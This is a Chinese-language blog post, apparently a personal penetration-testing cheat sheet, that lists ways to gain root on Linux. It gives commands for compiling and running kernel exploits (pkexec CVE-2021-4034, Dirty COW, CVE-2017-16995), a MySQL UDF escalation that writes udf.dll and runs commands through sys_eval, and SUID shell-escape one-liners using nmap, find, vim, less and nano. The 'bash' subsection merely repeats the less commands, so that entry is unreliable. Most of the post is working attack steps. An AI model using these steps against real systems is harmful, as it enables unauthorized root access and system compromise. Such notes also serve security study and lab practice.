<!DOCTYPE html>
<html lang="en"><head>
    <title>HUGO.386</title>
    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
    <meta content="utf-8" http-equiv="encoding">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no" />
    <meta name="theme-color" content="#000084" />
    <link rel="icon" href="https://fumerem.github.io/favicon.ico">
    <link rel="canonical" href="https://fumerem.github.io">
    
    
</head>
<body>
<nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="navbar-inner">
        <div class="container">
            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
            <a class="brand" href="https://fumerem.github.io">HUGO.386</a>
            <div class="nav-collapse collapse">
                <ul class="nav">
                    
                    
                        
                            <li>
                                <a href="/about/">
                                    
                                    <span>About</span>
                                </a>
                            </li>
                        
                    
                        
                            <li>
                                <a href="/posts/">
                                    
                                    <span>All posts</span>
                                </a>
                            </li>
                        
                    
                </ul>
            </div>
        </div>
    </div>
</nav><div id="content" class="container">

<div class="row-fluid navmargin">
    <div class="page-header">
        <h1>列举常见linux提权方式 - Sun, Jun 12, 2022</h1>
    </div>
    
    <h1 id="0x00信息收集">0x00信息收集</h1>
<pre tabindex="0"><code>lsb_release -a
查看系统发行版本

uname -a
查看内核版本

whoami
检测当前用户权限
</code></pre><h1 id="0x01-内核提权">0x01 内核提权</h1>
<h2 id="cve-2021-4034">CVE-2021-4034</h2>
<p>pkexec 本地提权</p>
<p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
<p>centos和ubuntu通杀</p>
<p><img src="https://s2.loli.net/2022/05/03/yWLrg8YFnKu3Bpv.png" alt=""></p>
<h2 id="脏牛提权-cve-2016-5195">脏牛提权-CVE-2016-5195</h2>
<p>条件: linux内核=&gt;2.6.22</p>
<p><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
<pre tabindex="0"><code>gcc -pthread dirty.c -o dirty -lcrypt
./dirty
mv /tmp/passwd.bak /etc/passwd
</code></pre><h2 id="cve-2017-16995">CVE-2017-16995</h2>
<p>影响版本: Linux Kernel Version 4.14-4.4 仅影响Ubuntu/Debian发行版本</p>
<p><a href="https://github.com/Al1ex/CVE-2017-16995">https://github.com/Al1ex/CVE-2017-16995</a></p>
<pre tabindex="0"><code>gcc exploit.c -o exploit
./exploit
</code></pre><h2 id="linenumsh本地linux枚举和提权辅助脚本">LINENUM.SH（本地LINUX枚举和提权辅助脚本）</h2>
<p>帮助提取linux系统信息</p>
<p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
<pre tabindex="0"><code>chmod +x /tmp/LinEnum.sh
sh /tmp/LinEnum.sh &amp;gt; /tmp/getinfo.txt
</code></pre><h2 id="linux-exploit-suggester2">linux-exploit-suggester2</h2>
<p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p>
<p>帮助查看系统存在的提取漏洞</p>
<pre tabindex="0"><code>perl linux-exploit-suggester-2.pl
</code></pre><h2 id="kali-searchexploit">kali searchexploit</h2>
<p>​	searchsploit是一个用于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。</p>
<p><strong>语法</strong></p>
<blockquote>
<p>searchsploit [options] term1 [term2] &hellip; [termN]</p>
<p>searchsploit [选项] 关键字1 [关键字2] &hellip; [关键字N]</p>
</blockquote>
<p><strong>选项</strong></p>
<blockquote>
<p>-c, &ndash;case[Term]执行区分大小写的搜索，缺省是对大小写不敏感。</p>
<p>-e, &ndash;exact [Term]对exploit标题执行EXACT匹配（默认为AND）</p>
<p>-h, &ndash;help在屏幕上显示帮助</p>
<p>-j, &ndash;json[Term]以JSON格式显示结果</p>
<p>-m, &ndash;mirror [EDB-ID]将一个漏洞利用镜像（副本）到当前工作目录，后面跟漏洞ID号</p>
<p>-o, &ndash;overflow [Term]Exploit标题被允许溢出其列</p>
<p>-p, &ndash;path[EDB-ID]显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号</p>
<p>-t, &ndash;title[Term]仅仅搜索漏洞标题（默认是标题和文件的路径）</p>
<p>-u, &ndash;update检查并安装任何exploitdb软件包更新（deb或git）</p>
<p>-w, &ndash;www [Term]显示Exploit-DB.com的URL而不是本地路径（在线搜索）</p>
<p>-x, &ndash;examine[EDB-ID]使用$ PAGER检查（副本）漏洞利用</p>
<p>-v &ndash;verbose 显示更多的输出信息</p>
<p>&ndash;colour在搜索结果中禁用颜色突出显示.</p>
<p>&ndash;id显示EDB-ID值而不是本地路径</p>
<p>&ndash;nmap[file.xml]使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）</p>
</blockquote>
<h1 id="0x02-mysql提权">0x02 Mysql提权</h1>
<p>前提条件:</p>
<blockquote>
<p>知道mysql用户名和密码,可以远程执行命令</p>
<p>mysql有写入文件的权限</p>
</blockquote>
<h2 id="1查看mysql有写入文件的权限">1.查看mysql有写入文件的权限</h2>
<pre tabindex="0"><code>show global variables like &#39;%secure%&#39;;
</code></pre><blockquote>
<p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p>
</blockquote>
<p>若secure_file_priv不为空白,可以在mysql/my.ini中修改</p>
<pre tabindex="0"><code> secure_file_priv = &#39; &#39;
</code></pre><p>然后重启apache服务</p>
<p>查看plugin位置</p>
<pre tabindex="0"><code>show variables like &#39;plugin%&#39;;
</code></pre><p>查看数据库和服务器架构信息</p>
<pre tabindex="0"><code>select @@version_compile_os, @@version_compile_machine;
</code></pre><h2 id="2上传写入动态链接库">2.上传&amp;写入动态链接库</h2>
<blockquote>
<p>1.Mysql版本大于5.1，plugin文件夹默认不存在，需要自行创建lib/plugin</p>
<p>#若失败，更改my.ini，添加plugin_dir=C:/或者C:/System32</p>
<p>2.Mysql版本小于5.1：
如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。
如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。</p>
</blockquote>
<h3 id="上传">上传</h3>
<p>利用sqlmap或者大马直接传输udf.dll,没什么好说的</p>
<h3 id="写文件">写文件</h3>
<pre tabindex="0"><code>create table temp(data longblob);
select 0x0....(16进制字节) INTO DUMPFILE &#39;C:\\udf.dll&#39;;
</code></pre><p>国光师傅已经归纳好了 <a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
<h2 id="3创建自定义函数">3.创建自定义函数</h2>
<pre tabindex="0"><code>create table temp(data longblob);
select 0x0.... INTO DUMPFILE &#39;C:\\udf.dll&#39;;
create function sys_eval returns string soname &#39;udf.dll&#39;;   #创建函数sys_eval
select * from mysql.func where name = &#39;sys_eval&#39;;    #查看创建的sys_eval函数
select sys_eval(&#39;whoami&#39;);       
</code></pre><h1 id="0x03-suid提权">0x03 SUID提权</h1>
<h2 id="1什么是suid">1.什么是SUID</h2>
<p>SUID(SET UID)是linux的一种特殊权限,当权限为suid的程序作为进程运行时,它的属主不是进程发起者,而是程序文件的所有者.(只针对二进制可执行文件)</p>
<p>比如在非root权限的条件下运行find程序,而find程序的所有者是root,我们就能短暂地执行root的命令,该进程的权限即为root.</p>
<pre tabindex="0"><code>设置SUID
chmod u+s filename   设置SUID位
chmod u-s filename   去掉SUID设置

ls -al               查看文件权限
</code></pre><h2 id="2利用suid提权">2.利用SUID提权</h2>
<p>常见的拥有SUID的程序有</p>
<blockquote>
<pre tabindex="0"><code>nmap
vim
find
bash
more
less
nano
cp
awk
</code></pre></blockquote>
<p>查看拥有SUID权限的文件,皆可.</p>
<pre tabindex="0"><code>find / -user root -perm -4000 -print 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
find / -user root -perm -4000 -exec ls -ldb {};
</code></pre><p>查看文件权限</p>
<p><img src="https://s2.loli.net/2022/05/03/WlE8fKQnMkUw2FO.png" alt=""></p>
<p>可见,权限为suid且所有者为root</p>
<h3 id="nmap202502">nmap(2.02~5.02)</h3>
<p>早期nmap带有交互模式,运行执行shell命令</p>
<pre tabindex="0"><code>nmap --interactive
nmap&gt; !sh
sh-3.2# whoami
root
</code></pre><h3 id="find">find</h3>
<pre tabindex="0"><code>touch demo
find demo -exec whoami \;
find demo -exec &#39;/bin/sh&#39; \;
</code></pre><h3 id="vim">vim</h3>
<pre tabindex="0"><code>vim/vi
:shell
</code></pre><h3 id="lessmore">less/more</h3>
<pre tabindex="0"><code>less /etc/passwd
!/bin/sh
</code></pre><h3 id="bash">bash</h3>
<pre tabindex="0"><code>less /etc/passwd
!/bin/sh
</code></pre><h3 id="nano">nano</h3>
<pre tabindex="0"><code>nano #进入nano编辑器
Ctrl + R
Ctrl + X
即可输入命令
</code></pre>
    <h4><a href="https://fumerem.github.io">Back to Home</a></h4>
</div>


        </div><footer class="container">
    <hr class="soften">
    <p>

    <a href="https://gitlab.com/maxlefou/hugo.386">hugo.386 theme by Max le Fou</a> | 

&copy; 
<a href="http://jmf-portfolio.netlify.com" target="_blank">
    Fumerem
</a>
<span id="thisyear">2020</span>


        | <a href="//gohugo.io" target="_blank">Hugo</a>Built on

</p>
    <p class="text-center">
        
        
        
        <a href="https://github.com">GitHub</a> 
        
    </p>
</footer>

</body><link rel="stylesheet" href="/css/bootstrap.css">
<link rel="stylesheet" href="/css/bootstrap-responsive.css">
<link rel="stylesheet" href="/css/style.css">

<script src="/js/jquery.js"></script>
<script src="/js/bootstrap-386.js"></script>
<script src="/js/bootstrap-transition.js"></script>
<script src="/js/bootstrap-alert.js"></script>
<script src="/js/bootstrap-modal.js"></script>
<script src="/js/bootstrap-dropdown.js"></script>
<script src="/js/bootstrap-scrollspy.js"></script>
<script src="/js/bootstrap-tab.js"></script>
<script src="/js/bootstrap-tooltip.js"></script>
<script src="/js/bootstrap-popover.js"></script>
<script src="/js/bootstrap-button.js"></script>
<script src="/js/bootstrap-collapse.js"></script>
<script src="/js/bootstrap-carousel.js"></script>
<script src="/js/bootstrap-typeahead.js"></script>
<script src="/js/bootstrap-affix.js"></script>
<script>
    _386 = { 
        fastLoad: false ,
        onePass: false , 
        speedFactor: 1 
    };

    
    function ThisYear() {
        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
    };
</script></html>
